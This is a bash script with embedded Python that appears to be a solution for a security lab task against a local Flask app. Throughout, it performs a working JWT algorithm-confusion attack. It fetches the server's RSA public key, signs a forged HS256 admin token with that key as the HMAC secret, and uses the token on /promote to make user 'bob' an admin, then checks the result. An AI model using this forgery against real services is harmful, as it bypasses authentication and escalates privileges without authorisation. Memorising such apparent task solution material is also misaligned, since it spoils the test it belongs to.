#!/usr/bin/env bash
set -euo pipefail

# Wait for Flask to be ready (up to 30 seconds)
echo "Waiting for Flask..."
for i in $(seq 1 30); do
    if curl -sf http://localhost:5000/users > /dev/null 2>&1; then
        echo "Flask is up."
        break
    fi
    sleep 1
done

# Step 1: Retrieve the RSA public key
curl -sf http://localhost:5000/public-key -o /tmp/pub_key.pem
echo "Retrieved public key."

# Step 2: Forge an admin JWT signed with HS256 using the public key as the HMAC secret.
# auth.py's _verify_hmac_compat verifies HS256 tokens by computing HMAC-SHA256 with
# the RSA public key PEM as the secret — so signing the same way produces a valid token.
python3 - <<'PYEOF'
import base64
import hashlib
import hmac
import json
import time


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


with open("/tmp/pub_key.pem") as f:
    key_bytes = f.read().encode("utf-8")

header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
payload = b64url(json.dumps({
    "sub": "attacker",
    "role": "admin",
    "iat": int(time.time()),
    "iss": "auth-service-v2",
}).encode())

signing_input = f"{header}.{payload}".encode("utf-8")
sig = b64url(hmac.new(key_bytes, signing_input, hashlib.sha256).digest())
forged_token = f"{header}.{payload}.{sig}"

with open("/tmp/forged_token.txt", "w") as f:
    f.write(forged_token)

print("Forged admin token written to /tmp/forged_token.txt")
PYEOF

FORGED_TOKEN=$(cat /tmp/forged_token.txt)

# Step 3: Call /promote to elevate bob to admin
RESPONSE=$(curl -sf -X POST http://localhost:5000/promote \
    -H "Authorization: Bearer ${FORGED_TOKEN}" \
    -H "Content-Type: application/json" \
    -d '{"username": "bob"}')

echo "Promote response: ${RESPONSE}"

# Step 4: Verify the change
USERS=$(curl -sf http://localhost:5000/users)
echo "Current users: ${USERS}"

python3 - <<PYEOF
import json, sys
users = json.loads("""${USERS}""")
bob_role = users.get("bob", {}).get("role")
if bob_role == "admin":
    print("SUCCESS: bob is now admin")
else:
    print(f"FAILURE: bob role is '{bob_role}'")
    sys.exit(1)
PYEOF
